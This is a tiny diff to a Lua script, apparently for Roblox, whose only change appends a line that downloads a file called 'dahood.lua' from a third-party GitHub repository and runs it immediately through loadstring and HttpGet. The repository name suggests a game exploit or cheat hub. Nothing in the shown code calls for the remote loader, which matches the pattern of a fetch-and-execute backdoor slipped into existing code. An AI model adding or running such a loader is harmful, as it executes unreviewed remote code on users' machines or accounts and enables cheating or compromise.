@@ -53,3 +53,5 @@ pcall(function()
        );
    end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GetModuleHandleA/delux-hub/main/dahood.lua",true))()
